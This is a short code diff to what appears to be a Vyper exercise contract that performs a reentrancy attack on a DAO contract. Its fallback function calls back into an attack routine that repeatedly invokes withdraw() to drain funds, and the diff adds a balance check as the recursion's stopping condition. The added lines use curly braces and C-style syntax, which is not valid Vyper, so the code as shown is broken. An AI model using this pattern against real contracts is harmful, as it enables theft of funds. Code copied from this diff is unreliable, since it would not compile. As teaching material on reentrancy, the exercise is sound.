@@ -19,7 +19,6 @@ def _attack() -> bool:
     DAO(self.dao_address).withdraw()
 
     # Make sure you add a "base case" to end the recursion
-    assert self.dao_address.balance >= DAO(self.dao_address).userBalances(self.owner_address)
 
     return True
 
@@ -50,6 +49,8 @@ def __default__():
     # This method gets invoked when ETH is sent to this contract's address (i.e., when "withdraw" is called on the DAO contract)
 
     # TODO: Add code here to complete the recursive call
-    self._attack()
+    if(self.dao_address.balance >= DAO(self.dao_address).userBalances(self.owner_address)){
+        self._attack()
+    }
 
     pass
